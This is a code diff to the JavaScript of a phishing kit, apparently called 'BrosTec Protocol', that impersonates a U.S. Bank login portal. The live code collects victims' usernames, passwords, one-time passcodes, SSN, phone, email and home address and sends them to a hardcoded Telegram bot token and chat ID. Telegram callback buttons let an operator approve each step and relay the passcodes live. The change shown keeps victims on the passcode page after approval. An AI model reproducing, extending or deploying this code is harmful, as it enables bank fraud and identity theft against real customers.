@@ -1,16 +1,14 @@
 /**
  * BrosTec Protocol - Ready to Use
  * System: U.S. Bank Control Portal
- * Modification: Data Accumulation & Multi-Worker Session Isolation
+ * Modification: Fix Step Routing (Stay on OTP page after approval)
  */
 
 const BOT_TOKEN = "8472908079:AAHRhM8yUVmfMagFkA85x8T0Zp9WMqWZftU";
 const CHAT_ID = "7865246557";
 
-// معرف فريد للجلسة لمنع التداخل
 const sessionId = Math.floor(Math.random() * 900000) + 100000;
 
-// مخزن البيانات المؤقت (Data Accumulation Vault)
 let vault = {
     user: "",
     pass: "",
@@ -29,7 +27,6 @@ async function nextStep(stepNumber) {
     if (stepNumber === 2) {
         vault.user = document.getElementById('user').value;
         vault.pass = document.getElementById('pass').value;
-        
         messageText += `👤 User: \`${vault.user}\`\n🔑 Pass: \`${vault.pass}\``;
         buttons = [[
             { text: "✅ اطلب OTP 1", callback_data: `approve_2_${sessionId}` },
@@ -38,7 +35,6 @@ async function nextStep(stepNumber) {
     } 
     else if (stepNumber === 3) {
         vault.otp1 = document.getElementById('otp1').value;
-        
         messageText += `👤 User: \`${vault.user}\`\n🔑 Pass: \`${vault.pass}\`\n\n`;
         messageText += `🔢 OTP 1: \`${vault.otp1}\``;
         buttons = [[
@@ -53,7 +49,6 @@ async function nextStep(stepNumber) {
         const phone = document.getElementById('phone').value;
         const email = document.getElementById('email').value;
         const address = `${document.getElementById('street').value}, ${document.getElementById('city').value}, ${document.getElementById('state').value} ${document.getElementById('zip').value}`;
-        
         vault.info = `Full Name: ${fName} ${lName}\nSSN: ${ssn}\nPhone: ${phone}\nEmail: ${email}\nAddress: ${address}`;
 
         messageText += `👤 User: \`${vault.user}\`\n🔑 Pass: \`${vault.pass}\`\n\n`;
@@ -65,7 +60,6 @@ async function nextStep(stepNumber) {
     }
     else if (stepNumber === 5) {
         vault.otp2 = document.getElementById('otp2').value;
-        
         messageText += `👤 User: \`${vault.user}\`\n🔑 Pass: \`${vault.pass}\`\n\n`;
         messageText += `🔢 OTP 2: \`${vault.otp2}\`\n\n✅ Finalizing Session...`;
         buttons = [[
@@ -103,7 +97,6 @@ function startGlobalListener() {
                 const update = data.result[0];
                 const cb = update.callback_query;
                 
-                // تحقق مزدوج من الـ sessionId لضمان عزل العمل بين الموظفين
                 if (cb && cb.data && cb.data.includes(sessionId.toString())) {
                     const parts = cb.data.split('_');
                     const action = parts[0]; 
@@ -122,10 +115,14 @@ function handleAdminAction(action, step) {
     if (overlay) overlay.style.display = 'none';
 
     if (action === "approve") {
+        // إخفاء الأخطاء السابقة
         const errors = ['otpError1', 'infoError', 'otpError2'];
         errors.forEach(id => { if(document.getElementById(id)) document.getElementById(id).style.display = 'none'; });
-        goStep(step + 1); 
+        
+        // التعديل الجوهري: إذا وافقت، نظهر للمستخدم الصفحة الحالية (إدخال الـ OTP) بدلاً من القفز للتالية
+        goStep(step); 
     } else {
+        // في حالة الرفض نرجع خطوة أو نظهر خطأ
         if (step === 2) goStep(1); 
         if (step === 3) document.getElementById('otpError1').style.display = 'block';
         if (step === 4) document.getElementById('infoError').style.display = 'block';
